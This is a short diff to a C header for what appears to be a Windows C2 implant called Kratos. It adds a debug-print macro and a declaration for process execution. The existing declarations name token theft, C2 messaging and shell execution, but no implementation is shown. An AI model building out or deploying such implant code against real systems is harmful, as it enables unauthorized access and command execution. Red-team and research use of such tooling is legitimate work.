@@ -2,7 +2,21 @@
 #define KRATOS_UTILS_H
 
 #include <stddef.h>
+#include <stdio.h>
 #include <windows.h>
+#include "config.h"
+
+#if DEBUG
+#define DEBUG_PRINT(...)                                                       \
+  do {                                                                         \
+    fprintf(stdout, "[DEBUG] ");                                               \
+    fprintf(stdout, __VA_ARGS__);                                              \
+    fprintf(stdout, "\n");                                                     \
+    fflush(stdout);                                                            \
+  } while (0)
+#else
+#define DEBUG_PRINT(...) do {} while (0)
+#endif
 
 /* Primary token stolen via steal_token, NULL if none. */
 extern HANDLE g_stolen_token;
@@ -16,6 +30,7 @@ char *base64_decode(const char *src, size_t len);
 unsigned char *base64_decode_bin(const char *src, size_t len, size_t *out_len);
 char *send_c2_message(const char *json_msg);
 char *execute_shell(const char *cmd);
+char *execute_process(const char *executable, const char *arguments);
 char *ConsoleOutputToUTF8(const char *input);
 void extract_json_string(const char *json, const char *key, char *buffer,
                          size_t buffer_size);
